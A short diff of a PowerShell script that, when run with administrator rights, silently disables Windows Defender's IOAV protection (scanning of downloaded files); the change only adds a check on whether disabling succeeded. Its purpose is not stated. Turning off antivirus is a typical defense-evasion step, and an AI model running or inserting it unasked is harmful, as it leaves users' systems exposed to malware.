@@ -7,7 +7,11 @@ $isAdmin = (
 # Disable defender if elevated
 if ($isAdmin) {
     Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
-    echo "IOAVProtection disabled"
+    if ($?) {
+        echo "IOAVProtection disabled"
+    } else {
+        echo "Disabling IOAVProtection failed"
+    }
 } else {
     echo "Run elevated to disable defender"
 }
